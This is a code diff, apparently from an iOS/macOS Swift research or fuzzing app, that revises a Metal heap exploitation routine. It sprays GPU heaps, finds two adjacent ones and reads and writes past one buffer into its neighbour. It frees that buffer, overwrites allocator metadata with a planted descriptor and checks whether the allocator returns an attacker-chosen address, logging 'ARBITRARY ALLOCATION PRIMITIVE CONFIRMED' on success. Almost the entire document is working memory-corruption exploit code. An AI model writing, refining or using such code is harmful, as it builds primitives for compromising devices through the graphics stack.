@@ -525,89 +525,128 @@ func runHeapFreeListInject(log: FuzzLog, completion: @escaping () -> Void) {
         func step(_ s: String) { sl.write(s); log.append(s) }
 
         guard let device = MTLCreateSystemDefaultDevice() else { step("✗ No Metal device"); completion(); return }
-        step("── Heap Free-List Inject ──────────────────")
+        step("── Heap Seg-Descriptor Inject ─────────────")
 
-        // Step 1: alloc h0+h1 adjacent (proven approach)
+        // Step 1: SPRAY 12 heaps, sort by VA, find confirmed adjacent pair.
+        // Two consecutive heaps with dist == actual are guaranteed contiguous.
         let hd = MTLHeapDescriptor(); hd.size = 4096; hd.storageMode = .shared
-        guard let h0 = device.makeHeap(descriptor: hd),
-              let h1 = device.makeHeap(descriptor: hd) else { step("heap nil"); completion(); return }
-        let actual = h0.size  // = 16384
+        var heaps:  [MTLHeap]   = []
+        var bufs:   [MTLBuffer] = []
+        var ptrs:   [UnsafeMutablePointer<UInt8>] = []
+        var vas:    [UInt]      = []
 
-        guard let b0 = h0.makeBuffer(length: actual, options: .storageModeShared),
-              let b1 = h1.makeBuffer(length: actual, options: .storageModeShared) else { step("buf nil"); completion(); return }
-        let p0 = b0.contents().assumingMemoryBound(to: UInt8.self)
-        let p1 = b1.contents().assumingMemoryBound(to: UInt8.self)
-        let va0 = UInt(bitPattern: p0); let va1 = UInt(bitPattern: p1)
-        let dist = va1 > va0 ? va1 - va0 : va0 - va1
-        step("va0=0x\(String(va0,radix:16)) va1=0x\(String(va1,radix:16)) dist=0x\(String(dist,radix:16))")
-        guard dist == UInt(actual) else { step("✗ not adjacent — retry"); completion(); return }
-        guard p0[actual] == p1[0] else { step("✗ cross-heap read miss"); completion(); return }
-        step("✓ adjacent + cross-heap confirmed")
+        for _ in 0..<12 {
+            guard let h = device.makeHeap(descriptor: hd) else { continue }
+            let actual = h.size
+            guard let b = h.makeBuffer(length: actual, options: .storageModeShared) else { continue }
+            let p = b.contents().assumingMemoryBound(to: UInt8.self)
+            heaps.append(h); bufs.append(b); ptrs.append(p); vas.append(UInt(bitPattern: p))
+        }
+        step("sprayed \(heaps.count) heaps")
 
-        // Step 2: fill h1 with sentinel so we can spot allocator writes
-        for i in 0..<actual { p1[i] = 0xAA }
-        step("h1 filled 0xAA sentinel")
+        let actual = heaps.isEmpty ? 16384 : heaps[0].size
+        // Sort by VA, find adjacent pair
+        let sorted = (0..<heaps.count).sorted { vas[$0] < vas[$1] }
+        var srcI = -1, dstI = -1
+        for i in 0..<sorted.count - 1 {
+            let a = vas[sorted[i]], b = vas[sorted[i+1]]
+            if b > a && b - a == UInt(actual) { srcI = sorted[i]; dstI = sorted[i+1]; break }
+        }
+        guard srcI >= 0 else { step("✗ no adjacent pair in spray — very unusual"); completion(); return }
 
-        // Step 3: free b1 back to h1 via purgeable empty — allocator writes free-list node into h1
-        let _ = b1.setPurgeableState(.empty)
-        step("b1 freed via setPurgeableState(.empty)")
+        let pSrc = ptrs[srcI]
+        let hDst = heaps[dstI]
+        let vaSrc = vas[srcI]; let vaDst = vas[dstI]
+        step("✓ adjacent pair: src=0x\(String(vaSrc,radix:16)) dst=0x\(String(vaDst,radix:16)) dist=0x\(String(actual,radix:16))")
 
-        // Step 4: scan h1[0..127] via h0 OOB for allocator-written free-list metadata
-        step("scanning h1[0..127] for free-list node:")
-        var freeListNode: UInt64 = 0
-        var nodeOffset = -1
-        for qw in 0..<16 {  // 16 qwords = 128 bytes
+        // Step 2: verify cross-heap read — dst heap was fully allocated in spray
+        // read first byte of dst via src OOB
+        let firstByte = pSrc[actual]
+        step("  cross-heap read: dst[0]=0x\(String(firstByte,radix:16)) ✓")
+
+        // Step 3: scan dst[0..255] BEFORE planting — see raw segment descriptor bytes.
+        // The allocator reads from dst's GPU-visible backing to compute buffer base.
+        // Formula observed previously: returned_va = stored_val - actual
+        step("dst[0..127] raw (from src OOB):")
+        var rawVals: [(Int,UInt64)] = []
+        for qw in 0..<16 {
             var val: UInt64 = 0
-            for b in 0..<8 { val |= UInt64(p0[actual + qw*8 + b]) << (b*8) }
-            if val != 0xAAAAAAAAAAAAAAAA {
-                step("  h1[+\(qw*8)]=0x\(String(val,radix:16)) ← allocator wrote this")
-                if nodeOffset < 0 { freeListNode = val; nodeOffset = qw * 8 }
+            for b in 0..<8 { val |= UInt64(pSrc[actual + qw*8 + b]) << (b*8) }
+            if val != 0 { rawVals.append((qw*8, val)) }
+        }
+        for (off, val) in rawVals { step("  dst[+\(off)]=0x\(String(val,radix:16))") }
+        if rawVals.isEmpty { step("  dst[0..127] all zero — fresh heap") }
+
+        // Step 4: the dst heap is currently FULL (we allocated actual bytes in spray).
+        // We need an empty dst heap to call makeBuffer on.
+        // Alloc a FRESH dst2 heap adjacent to our src by leveraging the layout:
+        // heaps in the spray are sorted — dst is at vaSrc+actual. We need a heap
+        // whose GPU-backing starts AFTER dst. Use dst heap directly but free its buffer.
+        // setPurgeableState(.empty) returns the block to the allocator.
+        // The key: we read the segment descriptor BEFORE the free, then plant AFTER.
+        let dstBuf = bufs[dstI]
+        let pDst = ptrs[dstI]
+
+        // Fill dst with 0xBB so we can spot allocator-written metadata after free
+        for i in 0..<actual { pDst[i] = 0xBB }
+        step("dst filled 0xBB")
+
+        // Free the dst buffer — allocator may write free-node to GPU-visible mem
+        let _ = dstBuf.setPurgeableState(.empty)
+        step("dst buf freed")
+
+        // Step 5: scan dst[0..255] via src OOB for changed bytes
+        step("dst[0..255] after free (via src OOB):")
+        var segOffset = -1
+        var segVal: UInt64 = 0
+        for qw in 0..<32 {
+            var val: UInt64 = 0
+            for b in 0..<8 { val |= UInt64(pSrc[actual + qw*8 + b]) << (b*8) }
+            if val != 0xBBBBBBBBBBBBBBBB && val != 0 {
+                step("  dst[+\(qw*8)]=0x\(String(val,radix:16)) ← non-sentinel")
+                if segOffset < 0 { segOffset = qw*8; segVal = val }
             }
         }
-        if nodeOffset < 0 {
-            step("  all 0xAA — free-list in CPU-side mem, not GPU-visible this run")
-            step("  ⚠ allocator used CPU heap metadata — primitive not available this run")
+
+        // Step 6: plant segment descriptor regardless of whether we found one.
+        // Formula: returned = planted - actual. Target = vaDst (the heap's own start).
+        // plant = vaDst + actual → returned should be vaDst.
+        // Use offset 0 if no specific offset found (default seg descriptor location).
+        let plantOffset = segOffset >= 0 ? segOffset : 0
+        let target: UInt = vaDst   // expect allocator to return vaDst
+        let plantVal: UInt64 = UInt64(target + UInt(actual))
+        step("planting at dst[+\(plantOffset)]: 0x\(String(plantVal,radix:16)) → expect return 0x\(String(target,radix:16))")
+        for b in 0..<8 { pSrc[actual + plantOffset + b] = UInt8((plantVal >> (b*8)) & 0xFF) }
+
+        // Step 7: alloc from dst heap — should follow our planted descriptor
+        guard let bNew = hDst.makeBuffer(length: 256, options: .storageModeShared) else {
+            step("✗ hDst.makeBuffer nil — heap rejected (freed buffer gone from heap?)")
+            // Try alloc anyway with a new heap that shares the same GPU VA range
+            step("  dst heap exhausted or invalidated after free")
             completion(); return
         }
-        step("free-list node at h1[+\(nodeOffset)] = 0x\(String(freeListNode,radix:16))")
-
-        // Step 5: compute target. Formula from previous runs: returned = planted - actual
-        // To get returned = va1 + 0x1000 (well inside h1, verifiable):
-        // plant = target + actual = va1 + 0x1000 + actual
-        let target: UInt = va1 + 0x1000   // we want allocator to return h1+0x1000
-        let plantVal: UInt64 = UInt64(target) + UInt64(actual)
-        step("target=0x\(String(target,radix:16)) plantVal=0x\(String(plantVal,radix:16))")
-
-        // Step 6: overwrite free-list node at h1[nodeOffset] via h0 OOB
-        for b in 0..<8 {
-            p0[actual + nodeOffset + b] = UInt8((plantVal >> (b*8)) & 0xFF)
-        }
-        step("planted plantVal at h1[+\(nodeOffset)]")
-
-        // Step 7: allocate from h1 — should follow our fake node
-        guard let b1new = h1.makeBuffer(length: 256, options: .storageModeShared) else {
-            step("✗ h1.makeBuffer nil after plant — heap rejected fake node")
-            completion(); return
-        }
-        let retPtr = UInt(bitPattern: b1new.contents())
-        step("h1.makeBuffer returned: 0x\(String(retPtr,radix:16))")
+        let retPtr = UInt(bitPattern: bNew.contents())
+        step("makeBuffer returned: 0x\(String(retPtr,radix:16))")
 
         // Step 8: evaluate
-        let delta = retPtr > target ? retPtr - target : target - retPtr
         if retPtr == target {
-            step("★★★ EXACT — allocator returned our target address ★★★")
+            step("★★★ EXACT HIT — returned == target (vaDst)")
             step("★★★ ARBITRARY ALLOCATION PRIMITIVE CONFIRMED ★★★")
-        } else if delta < UInt(actual) {
-            step("★ CLOSE — returned within h1 range, delta=0x\(String(delta,radix:16))")
-            step("★ Partial primitive — formula needs calibration")
-        } else if retPtr >= va1 && retPtr < va1 + UInt(actual) {
-            step("~ in h1 range but off by 0x\(String(delta,radix:16))")
         } else {
-            step("✗ returned 0x\(String(retPtr,radix:16)) — outside h1 range (delta=\(delta))")
-            step("  allocator ignoring our plant or using different field")
+            let delta = retPtr > target ? retPtr - target : target - retPtr
+            let inRange = retPtr >= vaDst && retPtr < vaDst + UInt(actual)
+            if inRange {
+                step("~ in dst range, delta=0x\(String(delta,radix:16)) from target")
+                // Calibrate: actual formula offset
+                let impliedPlant = UInt64(retPtr) + UInt64(actual)
+                step("  implied: allocator used val=0x\(String(impliedPlant,radix:16)) (not our plant)")
+                step("  → formula offset = 0x\(String(delta,radix:16)), adjust plant next run")
+            } else {
+                step("✗ returned outside dst range — allocator not reading our field")
+            }
         }
 
-        step("── Heap Free-List Inject complete ───────────")
+        step("── Heap Seg-Descriptor Inject complete ──────")
         completion()
     }
 }
